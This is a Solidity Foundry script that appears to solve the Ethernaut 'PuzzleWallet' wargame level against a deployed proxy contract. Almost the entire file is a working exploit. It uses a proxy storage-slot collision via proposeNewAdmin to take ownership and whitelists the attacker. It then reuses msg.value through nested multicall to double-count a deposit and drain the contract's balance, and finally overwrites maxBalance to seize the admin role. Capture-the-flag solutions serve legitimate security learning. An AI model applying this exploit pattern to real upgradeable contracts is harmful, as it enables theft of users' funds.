// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import  "../src/24.PuzzleWallet.sol";

contract PuzzleWalletScript is Script {
    function setUp() public {}

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);

        vm.startBroadcast(privateKey);

        address puzzleProxyAddress = 0xca45C9DFfDc4A8A1f6dbF1B574c139ce6Bdc50AC;
        
        // PuzzleProxy contract
        IPuzzleProxy puzzleProxy = IPuzzleProxy(puzzleProxyAddress);

        console.log("PuzzleProxy Admin:", puzzleProxy.admin());
        console.log("PuzzleProxy Pending Admin:", puzzleProxy.pendingAdmin());

        // PuzzleProxy delegatecall to PuzzleWallet so it behaves like PuzzleWallet
        PuzzleWallet puzzleProxyWallet = PuzzleWallet(puzzleProxyAddress);
        address proxyOwner = puzzleProxyWallet.owner();

        console.log("PuzzleProxy Owner:", proxyOwner);
        console.log("PuzzleProxy Owner Balance:", puzzleProxyWallet.balances(proxyOwner));
        console.log("PuzzleProxy Max balance:", puzzleProxyWallet.maxBalance());
        console.log("PuzzleProxy Owner whitelisted:", puzzleProxyWallet.whitelisted(proxyOwner));

        // implementation address is stored in implementationSlot
        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

        bytes32 implementationBytes32 = vm.load(address(puzzleProxyWallet), implementationSlot);
        address implementationAddress = address(uint160(uint256(implementationBytes32)));

        console.log("Implementation Address:", implementationAddress);

        // implementation is the actual PuzzleWallet contract
        PuzzleWallet implementation = PuzzleWallet(implementationAddress);

        // implementation is not initialized yet though it doesn't matter
        console.log("Implementation Owner:", implementation.owner());
        console.log("Implementation tMax balance:", implementation.maxBalance());

        // propose new admin
        puzzleProxy.proposeNewAdmin(player);

        // owner of the PuzzleWallet changes to player
        console.log("PuzzleProxy Owner:", puzzleProxyWallet.owner());

        // add player to whitelist
        puzzleProxyWallet.addToWhitelist(player);

        console.log("PuzzleProxy Owner whitelisted:", puzzleProxyWallet.whitelisted(player));

        // withdraw funds from the contract
        uint256 balanceToSteal = address(puzzleProxyWallet).balance;

        console.log("Balance to steal:", balanceToSteal);

        // execute multicall to withdraw funds
        bytes memory depositData = abi.encodeWithSelector(puzzleProxyWallet.deposit.selector);
        bytes memory executeCall = abi.encodeWithSelector(puzzleProxyWallet.execute.selector, player, balanceToSteal * 2, "");
        
        bytes[] memory multicallData = new bytes[](1);
        multicallData[0] = depositData;

        bytes[] memory data = new bytes[](3);

        data[0] = abi.encodeWithSelector(puzzleProxyWallet.multicall.selector, multicallData);
        data[1] = depositData;
        data[2] = executeCall;        

        puzzleProxyWallet.multicall{value: balanceToSteal}(data);

        console.log("Balance after steal:", address(puzzleProxyWallet).balance);

        // setMaxBalance to player
        puzzleProxyWallet.setMaxBalance(uint256(uint160(player)));

        // admin should be changed to player
        console.log("PuzzleProxy Admin:", puzzleProxy.admin());

        vm.stopBroadcast();
    }
}